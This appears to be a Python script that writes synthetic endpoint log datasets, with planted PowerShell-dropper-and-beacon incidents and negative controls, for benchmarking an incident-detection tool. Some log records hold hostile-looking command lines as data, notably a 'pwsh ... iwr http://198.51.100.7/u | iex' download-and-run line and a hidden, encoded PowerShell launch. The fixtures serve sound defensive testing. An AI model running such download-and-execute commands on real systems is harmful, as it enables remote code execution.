"""Offline / synthetic evidence dataset generator.

    python datasets/generate.py lab       --out DIR [--anchor now|ISO]
    python datasets/generate.py synthetic --out DIR --hosts 200 --noise 50000 --incidents 25 [--seed 7]

`lab` writes a small, hand-specified dataset whose ground truth is known
exactly (2 true incidents, 5 negative controls).  `synthetic` writes a large
seeded dataset with planted incidents for benchmarking.  Both emit three
source formats (JSONL, CSV, JSON) with source-native field names that the
manifest maps onto the JOCKY schema — the same path real exports take.

The data is synthetic.  It is labelled as such in the manifest.
"""
from __future__ import annotations

import argparse
import csv
import hashlib
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

FMT = "%Y-%m-%dT%H:%M:%S.%fZ"


def ts(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime(FMT)


def sysmon_ts(dt: datetime) -> str:
    # Sysmon-style "UtcTime" (space separator, milliseconds) exercises time normalization
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


def manifest(name: str, anchor: datetime, description: str) -> dict:
    return {
        "format": "jocky.dataset/0.1",
        "name": name,
        "synthetic": True,
        "description": description,
        "reference_time": ts(anchor),
        "default_host": "OFFLINE-01",
        "sources": [
            {"entity": "Process", "path": "process.jsonl", "format": "jsonl", "time_source": "start",
             "fields": {"host": "Computer", "time": "UtcTime", "pid": "ProcessId", "ppid": "ParentProcessId",
                        "name": "ImageName", "path": "Image", "cmdline": "CommandLine", "user": "User"}},
            {"entity": "File", "path": "file_events.csv", "format": "csv", "time_source": "birth"},
            {"entity": "NetworkConnection", "path": "network.json", "format": "json", "time_source": "event",
             "fields": {"local_ip": "local.ip", "local_port": "local.port",
                        "remote_ip": "remote.ip", "remote_port": "remote.port"}},
            {"entity": "User", "path": "users.jsonl", "format": "jsonl", "time_source": "observed"},
            {"entity": "Event", "path": "events.jsonl", "format": "jsonl", "time_source": "event"},
        ],
    }


class Writer:
    FILE_COLS = ["host", "time", "pid", "path", "name", "extension", "size", "action", "attribution", "sha256"]

    def __init__(self, out: Path):
        out.mkdir(parents=True, exist_ok=True)
        self.out = out
        self.proc = (out / "process.jsonl").open("w", encoding="utf-8", newline="\n")
        self.files_fh = (out / "file_events.csv").open("w", encoding="utf-8", newline="")
        self.files = csv.DictWriter(self.files_fh, fieldnames=self.FILE_COLS, lineterminator="\n")
        self.files.writeheader()
        self.net: list[dict] = []
        self.users = (out / "users.jsonl").open("w", encoding="utf-8", newline="\n")
        self.events = (out / "events.jsonl").open("w", encoding="utf-8", newline="\n")
        self.counts = {"process": 0, "file": 0, "network": 0, "user": 0, "event": 0}

    def process(self, host, t, pid, ppid, name, path, cmdline, user):
        self.proc.write(json.dumps({"Computer": host, "UtcTime": sysmon_ts(t), "ProcessId": pid,
                                    "ParentProcessId": ppid, "ImageName": name, "Image": path,
                                    "CommandLine": cmdline, "User": user}) + "\n")
        self.counts["process"] += 1

    def file(self, host, t, pid, path, size, action="create", attribution="event"):
        name = path.replace("\\", "/").rsplit("/", 1)[-1]
        ext = name.rsplit(".", 1)[-1] if "." in name else ""
        self.files.writerow({"host": host, "time": ts(t), "pid": "" if pid is None else pid, "path": path,
                             "name": name, "extension": ext, "size": size, "action": action,
                             "attribution": attribution if pid is not None else "none",
                             "sha256": hashlib.sha256(f"{host}{path}{size}".encode()).hexdigest()})
        self.counts["file"] += 1

    def conn(self, host, t, pid, rip, rport, lport, proto="tcp", direction="outbound", state="ESTABLISHED",
             lip="10.0.0.10"):
        self.net.append({"host": host, "time": ts(t), "pid": pid, "protocol": proto, "direction": direction,
                         "state": state, "local": {"ip": lip, "port": lport},
                         "remote": {"ip": rip, "port": rport}})
        self.counts["network"] += 1

    def user(self, host, t, name, uid, domain="", home=""):
        self.users.write(json.dumps({"host": host, "time": ts(t), "name": name, "uid": uid,
                                     "domain": domain, "home": home}) + "\n")
        self.counts["user"] += 1

    def event(self, host, t, channel, provider, event_id, record_id, level, message, pid=None):
        self.events.write(json.dumps({"host": host, "time": ts(t), "channel": channel, "provider": provider,
                                      "event_id": event_id, "record_id": record_id, "level": level,
                                      "pid": pid, "message": message}) + "\n")
        self.counts["event"] += 1

    def close(self, man: dict, truth: dict):
        (self.out / "network.json").write_text(json.dumps(self.net, indent=0), encoding="utf-8")
        for fh in (self.proc, self.files_fh, self.users, self.events):
            fh.close()
        man["counts"] = self.counts
        (self.out / "dataset.json").write_text(json.dumps(man, indent=2), encoding="utf-8")
        (self.out / "ground_truth.json").write_text(json.dumps(truth, indent=2), encoding="utf-8")


PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


def lab(out: Path, anchor: datetime) -> None:
    w = Writer(out)
    m = lambda minutes: timedelta(minutes=minutes)  # noqa: E731
    truth = {"expected_findings": [], "negative_controls": []}

    # --- background noise on every host -------------------------------------------
    for i, host in enumerate(["LAB-WS-01", "LAB-WS-02", "LAB-SRV-01"]):
        base = anchor - timedelta(hours=10)
        linux = host.startswith("LAB-SRV")
        w.user(host, anchor - m(1), "alice" if not linux else "deploy", f"S-1-5-21-100-{i}" if not linux else "1000",
               "LAB" if not linux else "", r"C:\Users\alice" if not linux else "/home/deploy")
        for j in range(12):
            pid = 1000 + i * 100 + j
            t = base + m(17 * j)
            if linux:
                w.process(host, t, pid, 1, "python3", "/usr/bin/python3", f"python3 worker.py --shard {j}", "deploy")
                w.file(host, t + m(1), pid, f"/var/lib/app/shard-{j}.db", 4096 * (j + 1))
                w.conn(host, t + m(2), pid, "10.0.5.20", 5432, 40000 + j)
            else:
                w.process(host, t, pid, 612, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                          "chrome.exe --type=renderer", "LAB\\alice")
                w.file(host, t + m(1), pid, rf"C:\Users\alice\Downloads\report-{j}.pdf", 120000 + j)
                w.conn(host, t + m(2), pid, "142.250.183.14", 443, 50000 + j)
            w.event(host, t, "System", "Service Control Manager", 7036, 9000 + i * 100 + j, "Information",
                    "The Windows Update service entered the running state." if not linux else "systemd: started job")

    # --- TP 1: LAB-WS-01 powershell drops a script and beacons out -------------------
    t0 = anchor - timedelta(hours=3)
    w.process("LAB-WS-01", t0, 4242, 612, "powershell.exe", PS,
              "powershell.exe -nop -w hidden -enc SQBFAFgA", "LAB\\alice")
    w.file("LAB-WS-01", t0 + m(2), 4242, r"C:\Users\alice\AppData\Local\Temp\stage2.ps1", 18432)
    w.conn("LAB-WS-01", t0 + m(5), 4242, "203.0.113.50", 443, 51515)
    truth["expected_findings"].append({"host": "LAB-WS-01", "pid": 4242})

    # --- TP 2: LAB-SRV-01 pwsh drops a shell script and beacons out ------------------
    t2 = anchor - timedelta(hours=2)
    w.process("LAB-SRV-01", t2, 777, 1, "pwsh", "/opt/microsoft/powershell/7/pwsh",
              "pwsh -NoProfile -c iwr http://198.51.100.7/u | iex", "deploy")
    w.file("LAB-SRV-01", t2 + m(4), 777, "/tmp/.cache/update.sh", 2048)
    w.conn("LAB-SRV-01", t2 + m(9), 777, "198.51.100.7", 8443, 44100)
    truth["expected_findings"].append({"host": "LAB-SRV-01", "pid": 777})

    # --- negative controls -----------------------------------------------------------
    t1 = anchor - timedelta(hours=6)
    w.process("LAB-WS-02", t1, 5100, 612, "powershell.exe", PS, "powershell.exe -File sync.ps1", "LAB\\bob")
    w.file("LAB-WS-02", t1 + m(1), 5100, r"C:\ProgramData\sync\state.json", 512)
    w.conn("LAB-WS-02", t1 + m(45), 5100, "203.0.113.77", 443, 52000)
    truth["negative_controls"].append("LAB-WS-02 pid 5100: connection 45m after start (outside 20m)")

    w.process("LAB-WS-02", t1 + m(30), 5300, 612, "powershell.exe", PS, "powershell.exe -c Start-Job", "LAB\\bob")
    w.file("LAB-WS-02", t1 + m(31), 5300, r"C:\Users\bob\AppData\Local\Temp\job.tmp", 64)
    w.conn("LAB-WS-02", t1 + m(33), 5300, "127.0.0.1", 8080, 52100)
    truth["negative_controls"].append("LAB-WS-02 pid 5300: loopback connection (excluded by cidr filter)")

    w.process("LAB-WS-01", t0 + m(60), 4400, 612, "powershell.exe", PS, "powershell.exe Get-Date", "LAB\\alice")
    w.conn("LAB-WS-01", t0 + m(61), 4400, "203.0.113.90", 443, 51600)
    truth["negative_controls"].append("LAB-WS-01 pid 4400: no file creation")

    old = anchor - timedelta(hours=30)
    w.process("LAB-WS-01", old, 3000, 612, "powershell.exe", PS, "powershell.exe -enc AAAA", "LAB\\alice")
    w.file("LAB-WS-01", old + m(2), 3000, r"C:\Users\alice\AppData\Local\Temp\old.ps1", 100)
    w.conn("LAB-WS-01", old + m(4), 3000, "203.0.113.50", 443, 51000)
    truth["negative_controls"].append("LAB-WS-01 pid 3000: outside the 24h window")

    w.process("LAB-SRV-01", t2 + m(20), 900, 1, "pwsh", "/opt/microsoft/powershell/7/pwsh", "pwsh -c ./check.ps1", "deploy")
    w.conn("LAB-SRV-01", t2 + m(21), 900, "198.51.100.8", 443, 44200)
    w.file("LAB-SRV-01", t2 + m(25), 900, "/tmp/check.out", 10)
    truth["negative_controls"].append("LAB-SRV-01 pid 900: connection precedes file creation (sequence order)")

    # PID collision across hosts: chrome pid 4242 on LAB-WS-02 must not join LAB-WS-01's powershell
    w.process("LAB-WS-02", t0 - m(30), 4242, 612, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              "chrome.exe", "LAB\\bob")
    w.file("LAB-WS-02", t0 + m(1), 4242, r"C:\Users\bob\Downloads\x.zip", 999)
    w.conn("LAB-WS-02", t0 + m(3), 4242, "142.250.183.14", 443, 52200)
    truth["negative_controls"].append("LAB-WS-02 pid 4242 (chrome): same pid as TP1 on another host")

    w.close(manifest("incident42-lab", anchor, "Hand-specified lab dataset for the Incident #42 scenario "
                     "(synthetic). 2 true incidents and 6 negative controls; see ground_truth.json."), truth)


def synthetic(out: Path, anchor: datetime, hosts: int, noise: int, incidents: int, seed: int) -> None:
    rng = random.Random(seed)
    w = Writer(out)
    truth = {"expected_findings": [], "seed": seed}
    host_names = [f"SYN-{'WS' if i % 4 else 'SRV'}-{i:04d}" for i in range(hosts)]
    windows_like = {h: "WS" in h for h in host_names}
    start = anchor - timedelta(hours=23)
    span = int(timedelta(hours=22).total_seconds())
    images_win = [("chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
                  ("svchost.exe", r"C:\Windows\System32\svchost.exe"),
                  ("explorer.exe", r"C:\Windows\explorer.exe"),
                  ("Teams.exe", r"C:\Users\u\AppData\Local\Microsoft\Teams\Teams.exe"),
                  ("powershell.exe", PS)]
    images_lin = [("python3", "/usr/bin/python3"), ("nginx", "/usr/sbin/nginx"), ("sshd", "/usr/sbin/sshd"),
                  ("pwsh", "/opt/microsoft/powershell/7/pwsh"), ("java", "/usr/bin/java")]
    used: dict[str, set[int]] = {h: set() for h in host_names}

    def new_pid(h: str) -> int:
        while True:
            p = rng.randint(200, 65000)
            if p not in used[h]:
                used[h].add(p)
                return p

    for n in range(noise):
        h = rng.choice(host_names)
        name, path = rng.choice(images_win if windows_like[h] else images_lin)
        pid = new_pid(h)
        t = start + timedelta(seconds=rng.randint(0, span))
        w.process(h, t, pid, rng.randint(4, 900), name, path, f"{name} --job {n}", "user")
        roll = rng.random()
        # noise that is *almost* an incident: shells that create files but connect late or to loopback
        if roll < 0.5:
            w.file(h, t + timedelta(seconds=rng.randint(1, 3600)), pid,
                   (rf"C:\Users\u\AppData\Local\Temp\f{n}.tmp" if windows_like[h] else f"/tmp/f{n}.tmp"),
                   rng.randint(10, 10_000_000), action=rng.choice(["create", "create", "modify"]))
        if roll < 0.7:
            late = timedelta(seconds=rng.randint(1500, 7200)) if name in ("powershell.exe", "pwsh") else \
                timedelta(seconds=rng.randint(1, 3600))
            rip = "127.0.0.1" if rng.random() < 0.1 else f"{rng.randint(11, 220)}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"
            w.conn(h, t + late, pid, rip, rng.choice([443, 80, 8443, 53, 22]), rng.randint(40000, 60000))
        if rng.random() < 0.2:
            w.event(h, t, "System", "Service Control Manager", 7036, n, "Information", "service state change", pid)
    for k in range(incidents):
        h = rng.choice(host_names)
        name, path = ("powershell.exe", PS) if windows_like[h] else ("pwsh", "/opt/microsoft/powershell/7/pwsh")
        pid = new_pid(h)
        t = start + timedelta(seconds=rng.randint(0, span - 3600))
        w.process(h, t, pid, 612, name, path, f"{name} -enc {k:04x}", "user")
        w.file(h, t + timedelta(seconds=rng.randint(10, 300)), pid,
               (rf"C:\Users\u\AppData\Local\Temp\s{k}.ps1" if windows_like[h] else f"/tmp/.s{k}.sh"), 4096)
        w.conn(h, t + timedelta(seconds=rng.randint(400, 1100)), pid, f"203.0.113.{k % 250 + 1}", 443, 45000 + k)
        truth["expected_findings"].append({"host": h, "pid": pid})
    w.close(manifest(f"synthetic-{hosts}h-{noise}n-{incidents}i-s{seed}", anchor,
                     "Seeded synthetic fleet dataset with planted Incident #42 chains (synthetic)."), truth)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("kind", choices=["lab", "synthetic"])
    ap.add_argument("--out", required=True)
    ap.add_argument("--anchor", default="2026-09-28T12:00:00Z", help="reference time, ISO or 'now'")
    ap.add_argument("--hosts", type=int, default=200)
    ap.add_argument("--noise", type=int, default=50_000)
    ap.add_argument("--incidents", type=int, default=25)
    ap.add_argument("--seed", type=int, default=7)
    a = ap.parse_args()
    if a.anchor == "now":
        anchor = datetime.now(timezone.utc).replace(microsecond=0)
    else:
        anchor = datetime.fromisoformat(a.anchor.replace("Z", "+00:00"))
    if a.kind == "lab":
        lab(Path(a.out), anchor)
    else:
        synthetic(Path(a.out), anchor, a.hosts, a.noise, a.incidents, a.seed)
    print(f"wrote {a.kind} dataset to {a.out} (reference_time {ts(anchor)})")


if __name__ == "__main__":
    main()
